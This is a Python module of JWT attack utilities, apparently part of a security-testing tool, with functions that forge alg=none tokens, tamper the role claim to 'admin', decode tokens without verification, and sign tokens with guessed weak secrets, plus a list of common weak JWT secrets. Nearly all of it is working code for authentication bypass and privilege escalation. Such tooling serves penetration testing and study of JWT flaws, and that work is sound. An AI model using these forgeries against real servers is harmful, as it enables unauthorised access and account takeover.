"""
JWT Helpers — Token forging and manipulation utilities.

Uses ONLY the standard library (base64 + json + hmac).
No PyJWT dependency — intentionally, because we're testing
servers that may not properly validate signatures.

Usage from attack modules:
    from src.utils.jwt_helpers import forge_alg_none, tamper_role
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
from typing import Any


def _b64url_encode(data: bytes) -> str:
    """Base64url encode without padding (JWT standard)."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _b64url_decode(s: str) -> bytes:
    """Base64url decode with padding restoration."""
    # Restore padding
    padding = 4 - len(s) % 4
    if padding != 4:
        s += "=" * padding
    return base64.urlsafe_b64decode(s)


def _build_jwt(header: dict[str, Any], payload: dict[str, Any], signature: bytes = b"") -> str:
    """Assemble a JWT from header, payload, and signature bytes."""
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    s = _b64url_encode(signature)
    return f"{h}.{p}.{s}"


def forge_alg_none(payload: dict[str, Any], header_extras: dict[str, Any] | None = None) -> str:
    """
    Create a JWT with alg=none (CVE-2015-9235 pattern).

    Many JWT libraries accept alg=none if not explicitly blocked,
    allowing complete authentication bypass.

    Args:
        payload: The JWT claims (e.g. {"sub": "admin", "role": "admin"}).
        header_extras: Additional header fields (e.g. {"kid": "..."}).

    Returns:
        A JWT string with no signature.
    """
    header: dict[str, Any] = {"alg": "none", "typ": "JWT"}
    if header_extras:
        header.update(header_extras)

    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())

    # alg=none → empty signature segment (but the trailing dot is required)
    return f"{h}.{p}."


def decode_jwt_unsafe(token: str) -> dict[str, Any]:
    """
    Decode a JWT WITHOUT signature verification.

    This is intentional — we're inspecting tokens, not trusting them.
    Useful for extracting claims from tokens found in tool responses.

    Args:
        token: A JWT string (header.payload.signature).

    Returns:
        Dict with 'header' and 'payload' keys.

    Raises:
        ValueError: If the token format is invalid.
    """
    parts = token.split(".")
    if len(parts) < 2:
        raise ValueError(f"Invalid JWT format: expected at least 2 parts, got {len(parts)}")

    try:
        header = json.loads(_b64url_decode(parts[0]))
    except (json.JSONDecodeError, Exception) as e:
        raise ValueError(f"Failed to decode JWT header: {e}") from e

    try:
        payload = json.loads(_b64url_decode(parts[1]))
    except (json.JSONDecodeError, Exception) as e:
        raise ValueError(f"Failed to decode JWT payload: {e}") from e

    return {"header": header, "payload": payload}


def tamper_role(token: str, new_role: str, role_field: str = "role") -> str:
    """
    Decode a JWT, change the role claim, and re-encode with alg=none.

    This tests whether the server validates the JWT signature.
    If the tampered token is accepted, the server is vulnerable.

    Args:
        token: Original JWT string.
        new_role: The role to inject (e.g. "admin", "superuser").
        role_field: The claim name for the role (default: "role").

    Returns:
        A new JWT with the modified role and alg=none.
    """
    decoded = decode_jwt_unsafe(token)
    payload = decoded["payload"]
    payload[role_field] = new_role
    return forge_alg_none(payload)


def forge_with_weak_secret(
    payload: dict[str, Any],
    secret: str,
    algorithm: str = "HS256",
) -> str:
    """
    Sign a JWT with a commonly-guessed secret.

    Tests servers using weak/default signing keys.
    Common secrets: "secret", "password", "key", "jwt_secret", "changeme".

    Args:
        payload: JWT claims.
        secret: The weak secret to sign with.
        algorithm: Signing algorithm (only HS256 supported).

    Returns:
        A signed JWT string.

    Raises:
        ValueError: If algorithm is not HS256.
    """
    if algorithm != "HS256":
        raise ValueError(f"Only HS256 supported for weak-secret forging, got: {algorithm}")

    header = {"alg": "HS256", "typ": "JWT"}
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())

    signing_input = f"{h}.{p}".encode("ascii")
    signature = hmac.new(secret.encode("utf-8"), signing_input, hashlib.sha256).digest()

    return f"{h}.{p}.{_b64url_encode(signature)}"


# ── Common weak secrets to try ──

COMMON_JWT_SECRETS: list[str] = [
    "secret",
    "password",
    "123456",
    "key",
    "jwt_secret",
    "changeme",
    "admin",
    "test",
    "default",
    "supersecret",
    "mysecret",
    "jwt",
    "token",
    "signing_key",
    "hmac_secret",
    "",  # empty string
]
